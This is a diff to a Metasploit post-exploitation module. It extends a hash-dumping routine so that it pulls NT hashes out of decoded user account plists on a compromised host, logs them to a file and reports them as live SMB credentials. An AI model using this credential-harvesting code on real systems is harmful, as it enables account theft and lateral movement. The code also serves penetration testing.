@@ -147,6 +147,7 @@ class Metasploit3 < Msf::Post
 	def dump_hash(log_folder,ver_num)
 		print_status("Dumping Hashes")
 		users = []
+		nt_hash = nil
 		host,port = session.tunnel_peer.split(':')
 		case session.type
 		when /meterpreter/
@@ -197,8 +198,11 @@ class Metasploit3 < Msf::Post
 							hash_decoded << sprintf("%02X", b)
 						end
 						user = plist_values['name']
+						# Check if NT HASH is present
+						if hash_decoded =~ /0304524E545D53414C5445442D5348413531324F101/
+							nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)
+						end
 						hashes = hash_decoded.gsub(/^\w*1044/,"")
-
 						sha512 = hashes.slice(0..135)
 
 
@@ -212,7 +216,25 @@ class Metasploit3 < Msf::Post
 							:pass   => sha512,
 							:active => false
 						)
+						# Reset hash value
+							sha512 = ""
 
+						if nt_hash
+							print_status("NT:#{user}:#{nt_hash}")
+							file_local_write(nt_file,"#{user}:#{nt_hash}")
+							report_auth_info(
+								:host   => host,
+								:port   => 445,
+								:sname  => 'smb',
+								:user   => user,
+								:pass   => nt_hash,
+								:active => true
+							)
+							
+							# Reset hash value
+							nt_hash = ""
+						end
+						# Reset hash value
 						hash_decoded = ""
 					end
 				end
